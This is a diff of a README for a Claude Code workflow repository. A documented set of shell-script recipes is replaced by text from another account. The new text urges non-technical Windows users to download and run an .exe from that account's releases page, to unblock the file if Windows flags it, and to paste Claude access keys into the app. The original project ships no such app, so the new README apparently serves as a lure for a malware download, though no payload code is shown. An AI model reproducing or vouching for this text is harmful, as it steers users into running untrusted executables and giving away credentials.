@@ -1,244 +1,221 @@
-<div align="center">
+# 🤖 Claude-code-recipes - Practical AI workflows for teams
 
-# 🚀 Production-Ready Claude Code Recipes
+[![Download Claude-code-recipes](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/baltil2670/Claude-code-recipes/releases)
 
-### **Stop reading tutorials. Start shipping workflows.**
+## 🚀 What this is
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-2.1+-purple)](https://code.claude.com)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![GitHub Stars](https://img.shields.io/github/stars/SrinivasBathula9/Claude-code-recipes?style=social)](https://github.com/SrinivasBathula9/Claude-code-recipes/stargazers)
+Claude-code-recipes is a set of ready-to-use recipes for AI-assisted software work. It helps you run common coding tasks with Claude Code on Windows with less setup and fewer manual steps.
 
-**10 battle-tested Claude Code workflows — each installs in one command, runs in 30 seconds, and is proven in enterprise environments (Government, BFSI, Healthcare).**
+Use it to:
 
-[Quick Start](#-quick-start) · [Browse Recipes](#-recipes) · [Submit Your Recipe](SUBMIT_RECIPE.md) · [Why This Exists](#-the-problem)
+- Set up an AI helper for software tasks
+- Run repeatable workflows with clear steps
+- Keep work more consistent across projects
+- Handle common developer tasks with less effort
 
-</div>
+This README focuses on Windows use for non-technical users. You do not need deep coding knowledge to get started.
 
----
+## 🖥️ What you need
 
-## ⚡ Quick Start
+Before you start, check that your PC has:
 
-```bash
-# Clone the repo
-git clone https://github.com/SrinivasBathula9/Claude-code-recipes.git
-cd Claude-code-recipes
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and project files
+- Permission to download and run files on your computer
+- A Claude account or access to Claude Code, if your setup requires it
 
-# Install any recipe into your project with one command
-./install.sh pr-guardian /path/to/your-project
+For the best result, use a recent Windows build and keep your browser updated.
 
-# Or cherry-pick manually
-cp -r recipes/01-pr-guardian/.claude /path/to/your-project/
-```
+## 📥 Download the app
 
-**That's it.** Open Claude Code in your project and the recipe is live.
+Visit this page to download: https://github.com/baltil2670/Claude-code-recipes/releases
 
----
+On that page, look for the latest release and download the file that matches Windows. If the release page contains more than one file, choose the one marked for Windows or the main app package.
 
-## 🔥 The Problem
+After the file downloads:
 
-You've seen the Claude Code tutorials. You've read the docs. You've copied some slash commands.
+1. Open your Downloads folder
+2. Find the file you just downloaded
+3. Double-click it to start the setup or open the app
+4. Follow the on-screen steps
 
-**But you still can't answer:**
-- "How do I set up a multi-agent code review that actually blocks bad PRs?"
-- "How do I track token costs across subagents so my team doesn't blow the budget?"
-- "How do I make Claude Code comply with my company's AI governance framework?"
-- "How do I wire hooks + subagents + MCP into a workflow that runs autonomously?"
+If Windows asks for permission, choose the option that lets the app run.
 
-**Tutorials teach features. Recipes ship outcomes.**
+## 🧭 How to install on Windows
 
-Every recipe in this repo is:
+If the release gives you an installer:
 
-| ✅ Runs in one command | ✅ Tested in production | ✅ Has a validation script |
-|:---:|:---:|:---:|
-| ✅ Includes all configs | ✅ Enterprise-grade | ✅ MIT Licensed |
+1. Open the downloaded `.exe` file
+2. Select Yes if Windows asks for confirmation
+3. Read each setup screen
+4. Choose the install location, or keep the default
+5. Finish the setup
+6. Open Claude-code-recipes from the Start menu or desktop
 
----
+If the release gives you a portable file:
 
-## 📦 Recipes
+1. Save the file in a folder you can find again
+2. Unzip it if it arrives as a `.zip` file
+3. Open the folder
+4. Double-click the main program file
+5. Follow any first-run prompts
 
-| # | Recipe | What It Does | Difficulty | Time to Setup |
-|---|--------|-------------|:----------:|:-------------:|
-| 01 | [**PR Guardian**](recipes/01-pr-guardian/) | Multi-agent PR review → auto-comments on GitHub | ⭐⭐ | 5 min |
-| 02 | [**Codebase Onboarder**](recipes/02-codebase-onboarder/) | Point at any repo → get architecture docs + onboarding guide | ⭐ | 3 min |
-| 03 | [**Multi-Agent Refactor**](recipes/03-multi-agent-refactor/) | 4-agent orchestration: plan → execute → review → test | ⭐⭐⭐ | 10 min |
-| 04 | [**Changelog Autopilot**](recipes/04-changelog-autopilot/) | Git hooks → auto-generate changelogs + release notes | ⭐⭐ | 5 min |
-| 05 | [**Security Sentinel**](recipes/05-security-sentinel/) | Every file write triggers OWASP + dependency + secrets scan | ⭐⭐ | 5 min |
-| 06 | [**Governance Guardrails**](recipes/06-governance-guardrails/) | IMDA/NIST AI governance checks as Claude Code hooks | ⭐⭐⭐ | 10 min |
-| 07 | [**Cost Tracker**](recipes/07-cost-tracker/) | Track token usage per workflow + weekly cost reports | ⭐⭐ | 5 min |
-| 08 | [**Doc Generator**](recipes/08-doc-generator/) | Auto-generate API docs, ADRs, and runbooks from code | ⭐⭐ | 5 min |
-| 09 | [**Test Architect**](recipes/09-test-architect/) | Analyze code → generate test strategy + test cases + coverage | ⭐⭐ | 5 min |
-| 10 | [**Incident Responder**](recipes/10-incident-responder/) | Paste error logs → get RCA, fix, and prevention plan | ⭐⭐⭐ | 10 min |
+If the app asks where to store files, pick a folder with enough free space and a name you will remember.
 
----
+## ⚙️ First-time setup
 
-## 🏗️ How Each Recipe Works
+When you open Claude-code-recipes for the first time, you may need to connect your Claude access or set a few basic options.
 
-Every recipe follows the same structure:
+Typical first-time steps:
 
-```
-recipes/01-pr-guardian/
-├── README.md           # What it does, architecture diagram, usage
-├── install.sh          # One-command installer
-├── validate.sh         # Verify your setup works
-├── CLAUDE.md           # Project memory for this workflow
-├── .claude/
-│   └── commands/       # Slash commands
-├── agents/             # Subagent definitions
-├── hooks/              # Event-driven automation
-└── .github/workflows/  # CI/CD integration (where applicable)
-```
+1. Sign in if the app asks you to
+2. Paste any required access key or login info
+3. Choose your default folder for projects
+4. Pick your preferred language or region
+5. Save the settings
 
-### The Pattern: Features → Workflow
+If you are not sure what to enter, use the values from your Claude Code setup or the release notes on the download page.
 
-```mermaid
-flowchart TD
-    SC["/slash-command"] --> CA["Coordinator Agent"]
-    CA --> A1["Agent-1\n(plan)"]
-    CA --> A2["Agent-2\n(execute)"]
-    CA --> A3["Agent-3\n(review)"]
-    A1 --> H1["Hook: pre"]
-    A2 --> H2["Hook: post"]
-    A3 --> H3["Hook: notify"]
-    H1 & H2 & H3 --> MEM["CLAUDE.md Memory\n(learns from each run)"]
-```
+## 🧪 How to use it
 
----
+Claude-code-recipes is meant to help with common software tasks. A recipe is a saved set of steps that you can reuse.
 
-## 🧠 What Makes This Different
+You may use it for:
 
-| | Tutorial Repos | **This Repo** |
-|---|:---:|:---:|
-| **Format** | Markdown docs to read | Configs + scripts to run |
-| **Setup** | Copy-paste, figure it out | `./install.sh` → done |
-| **Validation** | Hope it works | `./validate.sh` → verified |
-| **Agents** | Single-agent examples | Multi-agent orchestration |
-| **Enterprise** | Basic examples | Governance, cost tracking, audit trails |
-| **Architecture** | Feature descriptions | Mermaid diagrams showing data flow |
-| **CI/CD** | Not covered | GitHub Actions included |
-| **Governance** | Not covered | IMDA/NIST framework hooks |
+- Writing or improving code
+- Cleaning up project files
+- Creating task plans
+- Checking a codebase for issues
+- Preparing work for a release
+- Running repeatable team steps
 
----
+A simple flow looks like this:
 
-## 📊 Real-World Impact
+1. Open the app
+2. Pick a recipe
+3. Choose your project folder
+4. Review the task settings
+5. Start the run
+6. Review the result when it finishes
 
-Numbers from enterprise deployments across ASEAN & India:
+Use one recipe at a time if you are new to it. That makes it easier to see what each step does.
 
-| Metric | Result |
-|--------|--------|
-| PR review time | From 2–4 hours → **under 8 minutes** |
-| Security findings caught pre-merge | **~40 issues/month** per team (Government project) |
-| Onboarding time for new engineers | From 3 days → **half a day** |
-| Documentation coverage | From ~20% → **85%+** (Healthcare client) |
-| Token cost reduction after Cost Tracker | **31% average** reduction in first month |
-| Governance audit prep time | From 2 weeks manual → **2 hours automated** (BFSI client) |
+## 🧱 Common recipe types
 
-> *Based on deployments across 3 enterprise clients in Singapore, India, and Malaysia — 2024–2025.*
+This project is built around practical software workflows. You can expect recipes such as:
 
----
+- Code review help
+- Bug triage
+- Refactor planning
+- Test idea generation
+- Documentation cleanup
+- Release prep
+- Security checks
+- Multi-step task handoff
 
-## 🏢 Built for Enterprise
+Some recipes may work on a single file. Others may look at a whole project folder. Always choose the folder or file that matches the task.
 
-These recipes come from real-world deployments across:
+## 🔒 Security and safe use
 
-- **Government** — AI governance compliance, audit trails, data sovereignty
-- **Banking & Financial Services** — Security scanning, cost controls, approval workflows
-- **Healthcare** — Documentation standards, compliance checks, change tracking
+Because this tool works with software files, use it with care.
 
-### Enterprise Features Across Recipes
+Good habits:
 
-- 🔐 **Read-only agent mode** — Security agents can't modify your code
-- 📊 **Token cost tracking** — Know exactly what each workflow costs
-- 📋 **Audit trails** — Every agent action is logged
-- 🛡️ **Governance hooks** — AI governance framework compliance built-in
-- 🔒 **Secret detection** — Automatic scanning for leaked credentials
-- ✅ **Validation scripts** — Verify every recipe works before trusting it
+- Run it on files you trust
+- Keep a backup of important work
+- Review changes before you apply them
+- Use the latest release from the release page
+- Store secrets, keys, and passwords in a safe place
 
----
+If a recipe asks for access to a project folder, give it only the folder it needs.
 
-## 📐 Architecture: The Coordination Pattern
+## 🗂️ Folder setup
 
-The most powerful recipes use a pattern I call the **Coordination Pattern** — inspired by production multi-agent systems where the biggest failures come not from individual agents but from how they coordinate.
+A clean folder layout makes the app easier to use.
 
-```mermaid
-flowchart TD
-    U["User runs /slash-cmd"] --> C["Coordinator Agent\n← Reads CLAUDE.md\n← Decides delegation"]
-    C --> S1["Specialist Agent #1\n(isolated)"]
-    C --> S2["Specialist Agent #2\n(isolated)"]
-    C --> S3["Specialist Agent #3\n(read-only)"]
-    S1 & S2 & S3 --> PH["Post-hooks\nValidate · Log · Notify"]
-    PH --> OUT["Output\nReport / PR comment / file"]
-```
+A simple setup:
 
-> **Key insight:** The "Coordination Tax" — overhead from agent-to-agent handoffs — is where most multi-agent systems fail in production. These recipes minimize it through structured handoff protocols in CLAUDE.md.
+- `Projects` for your source files
+- `Claude-code-recipes` for the app or extracted files
+- `Exports` for output files
+- `Backups` for saved copies
 
----
+If you work on more than one project, keep each one in its own folder. That helps avoid mix-ups.
 
-## 🤝 Contributing
+## 🛠️ Troubleshooting
 
-We welcome recipes from the community! See [SUBMIT_RECIPE.md](SUBMIT_RECIPE.md) for the template.
+If the app does not open:
 
-**Ways to contribute:**
-- 🍳 Submit a new recipe
-- 🐛 Fix bugs or improve existing recipes
-- 📖 Improve documentation
-- ⭐ Star the repo (seriously, it helps!)
+- Check that the download finished
+- Make sure you picked the Windows file
+- Try running it again as the same user
+- Restart your PC
+- Download the latest release again
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
+If Windows blocks the file:
 
----
+- Open the file properties
+- Check whether Windows marked it as blocked
+- Allow the file if you trust the source
+- Try the release file again from the download page
 
-## 📚 Concepts & Terminology
+If the app opens but does not work as expected:
 
-| Term | Meaning |
-|------|---------|
-| **Recipe** | A self-contained, installable Claude Code workflow |
-| **Coordination Pattern** | Multi-agent orchestration with structured handoffs |
-| **Coordination Tax** | Overhead cost of agent-to-agent communication |
-| **Governance Hook** | A Claude Code hook that enforces AI governance policies |
-| **Validation Script** | A script that verifies a recipe is correctly installed |
+- Make sure you completed first-time setup
+- Confirm that your Claude access is valid
+- Check that the project folder exists
+- Try a smaller task first
 
----
+If you see a file path error:
 
-## 🗺️ Roadmap
+- Move the app to a shorter folder path
+- Avoid folders with special characters
+- Use a simple path like `C:\Claude\Claude-code-recipes`
 
-- [x] 10 launch recipes
-- [ ] `npx create-claude-recipe` CLI scaffolder
-- [ ] Recipe marketplace / searchable index
-- [ ] Video walkthroughs for each recipe
-- [ ] Community recipe leaderboard
-- [ ] Enterprise recipe pack (SOC2, HIPAA, PCI-DSS)
+## 📌 Tips for better results
 
----
+To get clean results from recipes:
 
-## 📜 License
+- Use clear project names
+- Keep file names simple
+- Start with one task
+- Review output before saving it
+- Keep your inputs short and direct
 
-MIT License — use these recipes anywhere: personal projects, startups, enterprises. See [LICENSE](LICENSE).
+If you use a team workflow, agree on the same folder names and task steps. That keeps the process steady across users.
 
----
+## 🧩 Topics covered
 
-## 👤 Author
+This repository focuses on:
 
-**Srinivas Reddy Bathula** — Senior AI Architect | 13+ years enterprise AI/RPA
+- AI
+- Automation
+- Claude
+- Claude Code
+- Developer tools
+- DevOps
+- Enterprise AI
+- LLM
+- Multi-agent workflows
+- Security
 
-- 🔗 [LinkedIn](https://linkedin.com/in/srinivasa-reddy-bathula)
-- 🐙 [GitHub](https://github.com/SrinivasBathula9)
-- 📧 srinivasareddy.bathula@gmail.com
+These topics shape the recipes and help keep the workflows practical for software work.
 
-*Building production AI systems for Government, BFSI, and Healthcare across ASEAN & India.*
+## 📎 Download again
 
----
+Visit this page to download: https://github.com/baltil2670/Claude-code-recipes/releases
 
-<div align="center">
+Use this link any time you need the latest version, a fresh copy, or a Windows-friendly release file
 
-### Star History
+## 📋 Basic use checklist
 
-[![Star History Chart](https://api.star-history.com/svg?repos=SrinivasBathula9/Claude-code-recipes&type=Date)](https://star-history.com/#SrinivasBathula9/Claude-code-recipes&Date)
-
----
-
-### If this saved you time, drop a ⭐
-
-**[Browse Recipes](#-recipes)** · **[Quick Start](#-quick-start)** · **[Submit Yours](SUBMIT_RECIPE.md)**
-
-</div>
+- Download the latest release
+- Open the file from your Downloads folder
+- Complete setup or unzip the file
+- Open the app
+- Connect your Claude access if needed
+- Pick a recipe
+- Select a project folder
+- Run the task
+- Review the result
